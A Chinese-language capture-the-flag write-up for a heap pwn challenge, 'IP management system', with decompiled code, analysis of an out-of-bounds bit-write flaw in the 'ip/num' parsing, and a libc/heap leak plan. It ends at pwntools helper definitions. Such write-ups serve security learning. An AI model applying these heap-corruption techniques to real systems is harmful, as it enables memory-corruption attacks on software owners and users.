<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="bca12c5eef2140645825c55fdbfeb638">WP-0ops2024-pwn-&lt;ip management="" system=""&gt;&lt;/ip&gt;</h1>
<p>这道题是0ops战队举办的国际比赛，也是第一次见证其他国外战队的实力。</p>
<p>比赛到最后我也只出了一道pwn题，最后是17解</p>
<h2 data-content="1" id="090062190635019d78b70e0cf5602057">堆题，我们直接看一些主要函数的运作方式</h2>
<blockquote>
<p>注：下面部分函数和变量名已经是修改过后的样子，如ret_ip_addr函数是解析输入的ip字符串为无符号占四字节的数据</p>
</blockquote>
<h3 data-content="1" id="a939ba828e61a37c83f4ec8571625b1a">"1. Create IP Set”</h3>
<div class="highlight"><pre><span></span><span class="n">printf</span><span class="p">(</span><span class="s">"Please input start ip:"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x1FuLL</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">ret_ip_addr</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Please input end ip:"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x1FuLL</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">ret_ip_addr</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="n">v2</span> <span class="o">||</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">v1</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="mh">0x10000</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(((</span><span class="n">v2</span> <span class="o">-</span> <span class="n">v1</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>            <span class="c1">// 最大size是0x2000</span>
</pre></div>
<p>输入需要录入起始ip与终止ip，每个ip按bit位来储存，也就是ip区间向右移动3位（整除8）的原因。加1是防止向后溢出一字节(整除会舍去余数，不加一的话结合后续函数可能造成向后溢出一字节)</p>
<h3 data-content="1" id="6774c60279fb4018a8ccb17938a50dde">"2-3. Add IP or Delete IP”</h3>
<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">add_or_delet</span><span class="p">(</span><span class="kt">int</span> <span class="n">opt</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">uint32_t</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-74h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-70h]</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-6Ch]</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-68h]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-58h]</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">nptr</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-50h]</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-48h]</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">56</span><span class="p">];</span> <span class="c1">// [rsp+50h] [rbp-40h] BYREF</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+88h] [rbp-8h]</span>

  <span class="n">v10</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x30uLL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Please input ip: "</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x2FuLL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">strchr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="sc">'-'</span><span class="p">)</span> <span class="p">)</span>                         <span class="c1">// if-else语句判断字符串的解析格式</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"-"</span><span class="p">);</span>
    <span class="n">nptr</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">"-"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">strchr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="sc">'/'</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"/"</span><span class="p">);</span>
    <span class="n">nptr</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">"/"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">ret_ip_addr</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&lt;</span> <span class="n">creat_ip_start</span> <span class="o">||</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="n">creat_ip_end</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>                                    <span class="c1">// 格式为,"ip"</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">ret_ip_addr</span><span class="p">(</span><span class="n">nptr</span><span class="p">);</span>                     <span class="c1">// 格式为：“ip-ip”</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">);</span>                            <span class="c1">// 格式为：“ip/num”</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v5</span> <span class="o">&gt;</span> <span class="mi">31</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">v2</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v5</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v5</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="n">v2</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="n">creat_ip_end</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">v3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">opt</span> <span class="p">)</span>
      <span class="n">ptr</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">|=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">);</span><span class="c1">// add堆上对应bit位赋值</span>
    <span class="k">else</span>
      <span class="n">ptr</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">));</span><span class="c1">// delete堆上对应bit位清零</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Edit IP Set Success!"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">v10</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>我们先判断分析最后的堆数据如何存入或修改的：</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">opt</span> <span class="p">)</span>
      <span class="n">ptr</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">|=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">);</span><span class="c1">// add堆上对应bit位赋值</span>
    <span class="k">else</span>
      <span class="n">ptr</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">));</span><span class="c1">// delete堆上对应bit位清零</span>
</pre></div>
<p>每个循环以当前选定ip与设置ip_start的距离整除8为修改字节，以余数决定1向左移动位数，进行与或运算</p>
<ol>
<li>或运算：或运算左移数据（二进制格式…00100…），即选定指定bit进行赋值</li>
<li>与运算：与运算左移数据取反后的数据（二进制格式…11011…）,即选定bit进行清理</li>
</ol>
<p>当时打题时发现v2大于ip_start时和我预期的一样，但是负数时就可能有些不同，所以我写了一个如下代码去测试负数到底怎么算的。</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=-</span><span class="mi">67</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">67</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%d : %d == 1 &lt;&lt; %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">i</span><span class="o">/</span><span class="mi">8</span><span class="p">,</span><span class="n">i</span><span class="o">&amp;</span><span class="mi">7</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>结果：</p>
<div class="highlight"><pre><span></span><span class="o">-</span><span class="mi">67</span> <span class="o">:</span> <span class="o">-</span><span class="mi">8</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span>
<span class="o">-</span><span class="mi">66</span> <span class="o">:</span> <span class="o">-</span><span class="mi">8</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span>
<span class="o">-</span><span class="mi">65</span> <span class="o">:</span> <span class="o">-</span><span class="mi">8</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span>
<span class="o">-</span><span class="mi">64</span> <span class="o">:</span> <span class="o">-</span><span class="mi">8</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span>
<span class="o">-</span><span class="mi">63</span> <span class="o">:</span> <span class="o">-</span><span class="mi">7</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span>
<span class="o">-</span><span class="mi">62</span> <span class="o">:</span> <span class="o">-</span><span class="mi">7</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span>
<span class="o">-</span><span class="mi">61</span> <span class="o">:</span> <span class="o">-</span><span class="mi">7</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span>
<span class="o">-</span><span class="mi">60</span> <span class="o">:</span> <span class="o">-</span><span class="mi">7</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span>
<span class="o">-</span><span class="mi">59</span> <span class="o">:</span> <span class="o">-</span><span class="mi">7</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span>
<span class="o">-</span><span class="mi">58</span> <span class="o">:</span> <span class="o">-</span><span class="mi">7</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span>
<span class="o">-</span><span class="mi">57</span> <span class="o">:</span> <span class="o">-</span><span class="mi">7</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span>
<span class="o">-</span><span class="mi">56</span> <span class="o">:</span> <span class="o">-</span><span class="mi">7</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span>
<span class="o">-</span><span class="mi">55</span> <span class="o">:</span> <span class="o">-</span><span class="mi">6</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span>
<span class="o">-</span><span class="mi">54</span> <span class="o">:</span> <span class="o">-</span><span class="mi">6</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span>
<span class="o">-</span><span class="mi">53</span> <span class="o">:</span> <span class="o">-</span><span class="mi">6</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span>
<span class="o">-</span><span class="mi">52</span> <span class="o">:</span> <span class="o">-</span><span class="mi">6</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span>
<span class="o">-</span><span class="mi">51</span> <span class="o">:</span> <span class="o">-</span><span class="mi">6</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span>
<span class="o">-</span><span class="mi">50</span> <span class="o">:</span> <span class="o">-</span><span class="mi">6</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span>
<span class="o">-</span><span class="mi">49</span> <span class="o">:</span> <span class="o">-</span><span class="mi">6</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span>
<span class="p">......</span>
<span class="o">-</span><span class="mi">10</span> <span class="o">:</span> <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span>
<span class="o">-</span><span class="mi">9</span> <span class="o">:</span> <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span>
<span class="o">-</span><span class="mi">8</span> <span class="o">:</span> <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span>
<span class="o">-</span><span class="mi">7</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span>
<span class="o">-</span><span class="mi">6</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span>
<span class="o">-</span><span class="mi">5</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span>
<span class="o">-</span><span class="mi">4</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span>
<span class="o">-</span><span class="mi">3</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span>
<span class="o">-</span><span class="mi">2</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span>
<span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span>
<span class="mi">0</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span>
<span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span>
<span class="mi">2</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span>
<span class="mi">3</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span>
<span class="mi">4</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span>
<span class="mi">5</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span>
<span class="mi">6</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span>
<span class="mi">7</span> <span class="o">:</span> <span class="mi">0</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span>
<span class="mi">8</span> <span class="o">:</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span>
<span class="mi">9</span> <span class="o">:</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span>
<span class="mi">10</span> <span class="o">:</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span>
<span class="p">......</span>
</pre></div>
<p>很显然同一个字节里，负数慢慢减小时，第一个修改的永远是最低的bit位，然后是最高bit位依次减小到倒数第二个bit位（这里我和同学分析了很久，一写这个代码一下就明白了，浪费了很多很多时间）</p>
<p>输入ip有三个格式，三个格式最后都以v2为存储或去除的起始ip，v3为存储或去除的终止ip</p>
<ol>
<li>格式1-”ip”：v2=输入ip，v2=v3，我们每次add或delete可以指定单个bit位进行运算</li>
<li>格式2-“ip1-ip2”：v2=ip1,v3=ip2，指定ip区间进行运算（作用不大，难以判断设置数据的bit位是否连用，不如全用格式1）</li>
<li>
<p>格式3-“ip/num”：这个有好说头，</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v5</span> <span class="o">&gt;</span> <span class="mi">31</span> <span class="p">)</span>
       <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
     <span class="n">v2</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v5</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
     <span class="n">v3</span> <span class="o">=</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v5</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="n">v2</span><span class="p">;</span>
</pre></div>
<p>v5就是格式里的num，限制了num的范围，</p>
<ol>
<li>v2赋值：1向左移动（32-num）位后 （二进制10000），减一（二进制数01111），取反（1111111…1110000），v2去与运算在这个数据后就是ip末(32-num)位清零，当我们ip_start数据末几位不为0，经过此运算后有可能v2小于ip_start造成向上溢出。</li>
<li>
<p>v3赋值：简单来说是ip末(32-num)位赋值</p>
<p>所以这是个大范围修改bit位，我们可以利用这个去改小size或者改size的p位0</p>
</li>
</ol>
</li>
</ol>
<h3 data-content="1" id="dc3513313b870f06b7e9b7d3b711d017">"4. Query IP”</h3>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="p">((</span><span class="n">ptr</span><span class="p">[(</span><span class="n">v1</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="n">v1</span> <span class="o">-</span> <span class="n">creat_ip_start</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"IP is in the set"</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="nf">puts</span><span class="p">(</span><span class="s">"IP is not in the set"</span><span class="p">);</span>
</pre></div>
<p>这个就比较简单了，就是判断我们输入的ip是否已经储存了。意思是我们可以判断指定bit位上是为1或者0</p>
<p>这里的函数可以利用，我们可以用来当write函数使用</p>
<h3 data-content="1" id="51bb6d056c904bc1dfa4f80087355477">"5. Delete IP Set”</h3>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">sub_1588</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
  <span class="n">ptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">creat_ip_start</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">creat_ip_end</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Delete IP Set Success!"</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>这个就比较正常了，没有UAF</p>
<h2 data-content="1" id="c39f3665c2b3b1e9dc44e287863bc138">打法：</h2>
<p>对于这类无限malloc，size范围比较大，指定输出堆数据，甚至是可以修改szie的题没有难度，</p>
<p>唯一有难度的是我们利用的chunk不会有chunk_list去储存堆。</p>
<p>那思路就来了：</p>
<ol>
<li>malloc大chunk，向上修改size变小，然后在堆内指定位置写上size，伪造大chunk的下一个chunk不是topchunk，free就能进入unsortedbin,malloc稍微小一点的回来拿libc，剩下的部分malloc大的chunk会进入smallbin，为一次循环</li>
<li>两次循环便可malloc回来便可拿heap</li>
</ol>
<blockquote>
<p>注：auto_read函数是比赛第一天写的函数，不过在第二天被优化了，不过也懒得改exp了，所以很短就一个creat加write</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="c1">#-----------------------------------------------------------------------------------------</span>
<span class="n">rv</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>            <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="o">=</span><span class="bp">False</span>      <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="o">=</span><span class="bp">True</span>     <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>            <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sd</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>            <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>            <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>          <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>         <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">inter</span> <span class="o">=</span> <span class="k">lambda</span>           <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">debug</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="bp">None</span> <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
<span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span><span class="n">addr</span>       <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">addr</span><span class="p">))</span>
<span class="n">pad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>           <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\x1B</span><span class="s2">[1;36m[+]{} =====&gt; 0x</span><span class="si">%x</span><span class="s2"> </span><span class="se">\x1B</span><span class="s2">[0m"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">%</span><span class="n">b</span><span class="p">)</span>
<span class="c1">#-----------------------------------------------------------------------------------------</span>

